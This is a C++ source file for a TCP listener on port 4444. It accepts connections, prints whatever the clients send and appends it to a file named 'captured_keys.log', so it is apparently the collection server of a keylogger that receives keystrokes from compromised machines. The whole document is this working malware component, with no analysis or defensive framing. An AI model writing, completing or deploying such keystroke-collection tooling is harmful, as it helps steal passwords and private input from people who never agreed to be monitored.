#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fstream>
#include <string>

const int  LISTEN_PORT = 4444;
const char* LOG_FILE   = "captured_keys.log";

int main() {
    int listenSock = socket(AF_INET, SOCK_STREAM, 0);
    if (listenSock < 0) {
        perror("socket");
        return 1;
    }

    // Allow port reuse after restart
    int opt = 1;
    setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family      = AF_INET;
    serverAddr.sin_port        = htons(LISTEN_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listenSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("bind");
        close(listenSock);
        return 1;
    }

    if (listen(listenSock, SOMAXCONN) < 0) {
        perror("listen");
        close(listenSock);
        return 1;
    }

    printf("[*] Listening on port %d...\n", LISTEN_PORT);
    printf("[*] Keys will be saved to %s\n", LOG_FILE);
    printf("[*] Press Ctrl+C to stop.\n\n");

    char recvBuf[4096];
    int  recvLen;

    while (true) {
        struct sockaddr_in clientAddr;
        socklen_t clientLen = sizeof(clientAddr);
        int clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &clientLen);

        if (clientSock < 0) {
            perror("accept");
            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
        printf("[+] Connection from %s\n", clientIP);

        while ((recvLen = recv(clientSock, recvBuf, sizeof(recvBuf) - 1, 0)) > 0) {
            recvBuf[recvLen] = '\0';
            printf("%s", recvBuf);

            std::ofstream logFile(LOG_FILE, std::ios::app);
            if (logFile.is_open()) {
                logFile << recvBuf;
                logFile.close();
            }
        }

        printf("\n[+] Connection closed.\n");
        close(clientSock);
    }

    close(listenSock);
    return 0;
}   